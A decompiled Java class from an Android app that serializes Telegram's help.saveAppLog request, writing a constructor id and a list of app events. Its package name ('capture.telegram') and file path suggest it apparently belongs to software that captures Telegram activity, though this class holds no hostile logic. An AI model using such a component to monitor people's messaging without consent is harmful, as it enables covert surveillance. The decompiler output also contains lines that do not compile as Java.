package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_help_saveAppLog
  extends TLObject
{
  public static int constructor = 1862465352;
  public ArrayList events;
  
  public TLRPC$TL_help_saveAppLog()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.events = localArrayList;
  }
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.Bool.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    paramAbstractSerializedData.writeInt32(481674261);
    int j = this.events.size();
    paramAbstractSerializedData.writeInt32(j);
    i = 0;
    TLRPC.TL_inputAppEvent localTL_inputAppEvent = null;
    for (int k = 0; k < j; k = i)
    {
      localTL_inputAppEvent = (TLRPC.TL_inputAppEvent)this.events.get(k);
      localTL_inputAppEvent.serializeToStream(paramAbstractSerializedData);
      i = k + 1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_help_saveAppLog.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */